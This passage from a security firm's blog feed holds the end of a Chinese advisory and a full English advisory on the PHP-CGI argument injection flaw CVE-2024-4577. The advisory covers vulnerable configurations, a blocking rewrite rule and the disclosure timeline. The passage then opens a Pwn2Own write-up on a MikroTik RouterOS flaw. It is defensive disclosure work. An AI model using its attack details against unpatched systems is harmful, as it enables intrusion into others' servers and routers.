&lt;p&gt;強烈建議所有使用者升級至 PHP 官方最新版本 &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;、&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; 與 &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;，對於無法升級的系統可透過下列方式暫時緩解弱點。&lt;/p&gt;

&lt;p&gt;除此之外，由於 PHP CGI 已是一種過時且易於出現問題的架構，也建議評估遷移至較為安全的 Mod-PHP、FastCGI 或是 PHP-FPM 等架構可能性。&lt;/p&gt;

&lt;h3 id=&quot;1-對無法更新-php-的使用者&quot;&gt;1. 對無法更新 PHP 的使用者&lt;/h3&gt;

&lt;p&gt;可透過下列 Rewrite 規則阻擋攻擊，請注意&lt;strong&gt;此份規則只作為繁體中文、簡體中文及日文語系中的暫時性緩解機制&lt;/strong&gt;，實務上仍建議更新到已修復版本或更改架構。&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-對-xampp-for-windows-使用者&quot;&gt;2. 對 XAMPP for Windows 使用者&lt;/h3&gt;

&lt;p&gt;在撰寫本文的當下，XAMPP 尚未針對此漏洞釋出相對應的更新安裝檔，如確認自身的 XAMPP 並無使用到 PHP CGI 之功能，可透過修改下列 Apache Httpd 設定檔以避免暴露在弱點中:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;找到相對應的設定行數:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;並將其註解:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;漏洞回報時間軸&quot;&gt;漏洞回報時間軸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE 透過 PHP 官方弱點通報頁面回報此問題。&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP 開發者確認弱點並強調要盡快修復。&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP 開發者釋出第一版修復並尋求建議。&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP 開發者釋出第二版修復並尋求建議。&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP 進入新版本發布準備。&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP 發布新版本 &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;、&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; 與 &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;參考資料&quot;&gt;參考資料&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Security Alert: CVE-2024-4577 - PHP CGI Argument Injection Vulnerability</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;During DEVCORE’s &lt;a href=&quot;https://devco.re/en/research/overview/&quot;&gt;continuous offensive research&lt;/a&gt;, our team discovered a remote code execution vulnerability in PHP. Due to the widespread use of the programming language in the web ecosystem and the ease of exploitability, DEVCORE classified its severity as critical, and promptly reported it to the PHP official team. The official team released a patch on 2024/06/06. Please refer to the &lt;a href=&quot;#Timeline&quot;&gt;timeline&lt;/a&gt; for disclosure details.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;While implementing PHP, the team did not notice the &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; feature of encoding conversion within the Windows operating system. This oversight allows unauthenticated attackers to bypass the previous protection of &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; by specific character sequences. Arbitrary code can be executed on remote PHP servers through the argument injection attack.&lt;/p&gt;

&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;

&lt;p&gt;This vulnerability &lt;strong&gt;affects all versions of PHP installed on the Windows operating system&lt;/strong&gt;. Please refer to the table below for details:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since the branch of PHP 8.0, PHP 7, and PHP 5 are &lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;End-of-Life&lt;/a&gt;, and are no longer maintained anymore, server admins can refer to the &lt;a href=&quot;#am-i-vulnerable&quot;&gt;Am I Vulnerable&lt;/a&gt; section to find temporary patch recommendations in the &lt;a href=&quot;#mitigation-measure&quot;&gt;Mitigation Measure&lt;/a&gt; section.&lt;/p&gt;

&lt;h2 id=&quot;am-i-vulnerable&quot;&gt;Am I Vulnerable?&lt;/h2&gt;

&lt;p&gt;For the usual case of combinations like Apache HTTP Server and PHP, server administrators can use the two methods listed in this article to determine whether their servers are vulnerable or not. It’s notable to address that Scenario-2 is also the default configuration for &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt;, so &lt;strong&gt;all versions of XAMPP installations on Windows are vulnerable by default&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As of this writing, it has been verified that when the Windows is running in the following locales, &lt;strong&gt;an unauthorized attacker can directly execute arbitrary code on the remote server&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Traditional Chinese (Code Page 950)&lt;/li&gt;
  &lt;li&gt;Simplified Chinese (Code Page 936)&lt;/li&gt;
  &lt;li&gt;Japanese (Code Page 932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For Windows running in other locales such as English, Korean, and Western European, due to the wide range of PHP usage scenarios, it is currently not possible to completely enumerate and eliminate all potential exploitation scenarios. Therefore, it is recommended that users conduct a comprehensive asset assessment, verify their usage scenarios, and update PHP to the latest version to ensure security.&lt;/p&gt;

&lt;h3 id=&quot;scenario-1-running-php-under-cgi-mode&quot;&gt;&lt;strong&gt;Scenario 1&lt;/strong&gt;: Running PHP under CGI mode&lt;/h3&gt;

&lt;p&gt;When configuring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; directive to map corresponding HTTP requests to a PHP-CGI executable binary in Apache HTTP Server, this vulnerability can be exploited directly. Common configurations affected include, but are not limited to:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scenario-2-exposing-the-php-binary-also-the-default-xampp-configuration&quot;&gt;&lt;strong&gt;Scenario 2&lt;/strong&gt;: Exposing the PHP binary (also the default XAMPP configuration)&lt;/h3&gt;

&lt;p&gt;Even if PHP is not configured under the CGI mode, merely exposing the PHP executable binary in the CGI directory is affected by this vulnerability, too. Common scenarios include, but are not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Copying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; directory.&lt;/li&gt;
  &lt;li&gt;Exposing the PHP directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; directive, such as:
    &lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;mitigation-measure&quot;&gt;Mitigation Measure&lt;/h2&gt;

&lt;p&gt;It is strongly recommended that all users upgrade to the latest PHP versions of &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;. For systems that cannot be upgraded, the following instructions can be used to temporarily mitigate the vulnerability.&lt;/p&gt;

&lt;p&gt;However, since PHP CGI is an outdated and problematic architecture, it’s still recommended to evaluate the possibility of migrating to a more secure architecture such as Mod-PHP, FastCGI, or PHP-FPM.&lt;/p&gt;

&lt;h3 id=&quot;1-for-users-who-cannot-upgrade-php&quot;&gt;1. For users who cannot upgrade PHP:&lt;/h3&gt;

&lt;p&gt;The following Rewrite Rules can be used to block attacks. Please note that &lt;strong&gt;these rules are only a temporary mitigation for Traditional Chinese, Simplified Chinese, and Japanese locales&lt;/strong&gt;. It is still recommended to update to a patched version or migrate the architecture in practice.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-for-users-who-use-xampp-for-windows&quot;&gt;2. For users who use XAMPP for Windows:&lt;/h3&gt;

&lt;p&gt;XAMPP has not yet released corresponding update files for this vulnerability at the time of writing this article. If you confirm that you do not need the PHP CGI feature, you can avoid exposure to the vulnerability by modifying the following Apache HTTP Server configuration:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Locating the corresponding lines:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And comment it out:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE reported this issue through the official PHP vulnerability disclosure page.&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP developers confirmed the vulnerability and emphasized the need for a prompt fix.&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP developers released the first version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP developers released the second version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP entered the preparation phase for the new version release.&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP released new versions &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE 研究組在 Pwn2Own Toronto 2022 白帽駭客競賽期間，透過研究過去少有人注意到的攻擊面，在 MikroTik 旗下路由器產品所使用的 RouterOS 作業系統中，發現了存在九年之久的 WAN 端弱點，透過串連該弱點與另一個同樣由 DEVCORE 發現的 Canon printer 弱點，DEVCORE 成為史上第一個在 Pwn2Own 賽事中成功挑戰 SOHO Smashup 項目的隊伍；最終 DEVCORE 在 Pwn2Own Toronto 2022 奪下冠軍，並獲頒破解大師（Master of Pwn）的稱號。&lt;/p&gt;

&lt;p&gt;該 WAN 端弱點發生在 RouterOS 中的 radvd 程式，由於該程式在處理 IPv6 SLAAC 的 ICMPv6 封包時，未對 RDNSS 欄位的長度進行檢查，導致攻擊者可透過發送兩次 Router Advertisement 封包觸發緩衝區溢位攻擊，使得攻擊者可在不需登入且無需使用者互動的情況下控制路由器底層的 Linux 系統進行高權限操作，取得路由器的完整控制權；此弱點被登記為 CVE-2023-32154，其 CVSS 分數為 7.5。&lt;/p&gt;

&lt;p&gt;針對上述弱點， DEVCORE 已於 2022/12/29 經由 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; 回報 MikroTik 處理，並在 2023/05/19 完成修補，以下 RouterOS 版本已經對此弱點進行修補：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-與-soho-smashup-簡介&quot;&gt;Pwn2Own 與 SOHO Smashup 簡介&lt;/h2&gt;

&lt;p&gt;Pwn2Own 是一系列由趨勢科技的 Zero Day Initiative（ZDI）主辦的比賽，每場賽事都會針對該次主題挑選一些熱門的產品作為目標，例如：作業系統、瀏覽器、電動車、工控系統、路由器、印表機、智慧音箱、手機、NAS、網路攝影機……等等。只要參賽隊伍可以在無需使用者互動、設備處於預設狀態、軟體更新至最新版本的條件下，演示攻擊並成功獲得設備的主控權，就可以獲得相應的 Master of Pwn 點數和獎金。賽末結算時，Master of Pwn 點數最高的隊伍就是冠軍，也被稱為破解大師（Master of Pwn）。&lt;/p&gt;

&lt;p&gt;前幾年由於疫情的關係，Work From Home 或是 SOHO（即小型辦公／家庭辦公）變得非常普遍，因此 2022 的 Pwn2Own  Toronto 也新增了一個稱作 SOHO Smashup 的特別項目，參賽者需要從 WAN 端入侵路由器後，再將路由器作為跳板攻擊居家常見的設備，例如：智慧音響、印表機等設備。&lt;/p&gt;

&lt;p&gt;這個特別的新項目，除了獎金是所有項目中第二高的 $100,000（USD）之外，得分也是最高的十分，因此如果目標是奪冠，奪下這個項目絕對是如虎添翼！DEVCORE 在本次賽事中也特別挑選較少人研究的 MikroTik 作為目標，避免與他人找到重複的漏洞（與其他人撞洞時，獎金與得分皆減半），最大化奪冠的機率。&lt;/p&gt;

&lt;h2 id=&quot;routeros-簡介&quot;&gt;RouterOS 簡介&lt;/h2&gt;

&lt;p&gt;MikroTik 開發的 RouterOS 是一套基於 Linux 核心的作業系統，也是 MikroTik 旗下產品 「RouterBoard」上預設安裝的作業系統，RouterOS 亦可被安裝在個人電腦上，用來將電腦作為路由器使用。&lt;/p&gt;

&lt;p&gt;雖然基於 Linux 核心開發的 RouterOS 確實有使用 GPL 授權的開源軟體，但如果想要得到相關的程式碼，根據官方網站 &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; 的說明，需要匯 45 塊美金給 MikroTik ，他們才會寄給你一張燒好 GPL source 的光碟，非常有趣的想法！幸好已經有人將 MikroTik 的 &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source&lt;/a&gt;上傳到 Github，但在檢視過後，我們認為裡面的程式碼對於後續分析沒有太大的幫助。&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-與-routeros-v6&quot;&gt;RouterOS v7 與 RouterOS v6&lt;/h3&gt;

&lt;p&gt;在 MikroTik 官網的下載頁面上同時存在 RouterOS v7 以及 RouterOS v6 兩個版本，兩者之間的關係比較像是 RouterOS 的不同 branch，在設計上大同小異。因為我們的目標設備 RouterBoard RB2011UiAS-IN 預設安裝的是 RouterOS v6，所以我們先以 RouterOS v6 作為研究對象。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS 並沒有正式提供一個方法讓使用者直接管理底層的 Linux 系統，使用者被關在一個功能受限的 console 裡面，只能使用 RouterOS 提供的有限指令去管理這台路由器。因此過去有不少研究是關於如何 jailbreak RouterOS。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS 上的 binary 之間使用一種 MikroTik 自製的 IPC 進行溝通，此 IPC 利用稱為 nova message 的資料結構在各程式間交換資訊，因此我們將這類 binary 統一稱作 nova binary。&lt;/p&gt;

&lt;p&gt;另外，RouterOS 還存在一個比較特別的攻擊面。在日常應用中，使用者可以透過 WinBox 這套 GUI 管理工具在 Windows 電腦上對 RouterOS 進行遠端管理，其原理是透過 TCP 向路由器傳送 nova message。因此若 RouterOS 沒有針對 nova message 做好權限驗證時，攻擊者就有機會自遠端發送一個夾帶惡意 nova message 的 TCP 封包入侵路由器；不過 WinBox 預設僅能從 LAN 端使用，對我們來說不是優先事項，因為這次的目標是從 WAN 端進行攻擊！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-回顧&quot;&gt;CVE 回顧&lt;/h2&gt;

&lt;p&gt;首先，為了熟悉 RouterOS 的攻擊面，我們全面審視了過去的 CVE。當時與 RouterOS 有關的 CVE 總共有 80 個，而當中可被用來在 pre-auth 情境下進行攻擊，且目標是路由器本身的共有 28 個 。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;28 個 CVE 當中有 4 個 CVE 的使用情境是較符合 Pwn2Own 規則所描述的情境，這些 CVE 可以讓攻擊者在不需使用者互動的情況下在路由器上喚起一個 shell 或登入為 admin。這 4 個漏洞當中，有 3 個是在 2017 年至 2019 年這段時間被發現的，而且當中 3 個是「in the wild」而不是第一時間經由白帽駭客主動通報，這四個漏洞分別是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149：又稱 Chimay-Red，是 2017 年從 CIA 外洩的武器庫「Vault 7」中，針對 RouterOS 進行攻擊的漏洞之一。漏洞發生在 RouterOS 解析 HTTP 請求時，若 HTTP headers 中的 Content-Length 是負值，會造成 Integer Underflow，搭配 Stack Clash 的攻擊手法就能控制程式流程達成 RCE。&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;：是一個存在於 RouterOS 自己實做的 SMB 中的 buffer overflow。這是透過黑箱模糊測試找到的漏洞，也是四個漏洞中唯一一個由發現者自行回報的漏洞，一樣能夠控制程式執行流程最後達成 RCE，但 SMB 不是預設開啟的服務。&lt;/li&gt;
  &lt;li&gt;CVE-2018-14847：也是「Vault 7」中針對 RouterOS 進行攻擊的漏洞之一。這個漏洞使攻擊者可以不需登入就讀取任意檔案，乍聽之下好像不是大問題，但由於在 RouterOS 的早期版本中，使用者的密碼是以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt; 的方式儲存在檔案中，所以只要能夠讀取這個檔案，攻擊者就可以逆算得到 admin 的密碼。&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;：在 SCEP 服務的 base64 解碼過程中，因為長度計算錯誤導致的 heap buffer overflow 漏洞，這是資安研究員分析了 APT 在其 C2 server 上的 exploit 後反推出來的漏洞。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可以發現，這些漏洞大多是「in the wild」，我們無從得知當初發現漏洞的人是如何進行分析及思考。因此關於分析 RouterOS 的思路或是技巧，透過這些漏洞能學習到的十分有限。&lt;/p&gt;

&lt;h2 id=&quot;相關研究回顧&quot;&gt;相關研究回顧&lt;/h2&gt;

&lt;p&gt;我們繼續研讀公開的研究資料，在比賽的當下我們有這些文章以及演講可以參考：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;主要關於 jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;主要關於 jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;主要關於 jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;探討 IPC 中的 nova message 的運作&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;與 2018 的演講內容相同&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;當時的 WinBox 存在一個弱點：當暴露在外網時，可以被用來對內網進行掃描&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018–7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;透過黑箱模糊測試找到 SMB 中的 Buffer Overflow 以及完整 exploit 方法&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
